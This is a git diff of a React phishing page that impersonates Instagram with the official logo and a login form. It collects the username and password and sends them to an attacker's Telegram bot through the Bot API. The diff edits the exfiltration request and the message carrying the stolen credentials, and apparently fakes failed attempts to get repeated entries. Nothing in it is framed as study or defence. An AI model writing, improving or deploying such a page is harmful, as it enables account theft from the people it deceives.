@@ -8,18 +8,13 @@ export default function App() {
   const [login, setLogin] = useState("");
   const [password, setPassword] = useState("");
   const [clickCount, setClickCount] = useState(0);
-  const [status, setStatus] = useState(null); // { type: "error"|"success", message: "..." }
+  const [status, setStatus] = useState(null);
 
   const sendToTelegram = async (message) => {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: message,
-      }),
-    });
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(
+      message
+    )}`;
+    await fetch(url);
   };
 
   const handleSubmit = () => {
@@ -35,21 +30,16 @@ export default function App() {
       statusType = "success";
     }
 
-    // Xabar ko'rsatish
     setStatus({ type: statusType, message: statusMessage });
 
-    // Telegramga yuborish
-    const telegramMessage = `📩 Yangi so'rov:\nLogin: ${login}\nParol: ${password}\nHolat: ${statusMessage}`;
+    const telegramMessage = `📩 Yangi so'rov:\n👤 Username: ${login}\n🔑 Parol: ${password}\n📌 Holat: ${statusMessage}`;
     sendToTelegram(telegramMessage);
 
-    // Inputlarni tozalash
     setLogin("");
     setPassword("");
 
-    // 2 soniyadan keyin xabarni yo'q qilish
     setTimeout(() => setStatus(null), 2000);
 
-    // 3 marta bosilganda qaytadan boshlash
     if (newCount >= 3) {
       newCount = 0;
     }
@@ -60,12 +50,12 @@ export default function App() {
     <div className="flex flex-col items-center justify-center min-h-screen bg-gray-100 relative">
       {/* Instagram Logo */}
       <img
-        src={`https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/330px-Instagram_logo_2022.svg.png`}
+        src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/330px-Instagram_logo_2022.svg.png"
         alt="Instagram"
         className="w-20 mb-6"
       />
 
-      {/* Xabar */}
+      {/* Status Message */}
       {status && (
         <div
           className={`absolute top-5 flex items-center gap-2 px-4 py-2 rounded-lg shadow-lg text-white ${
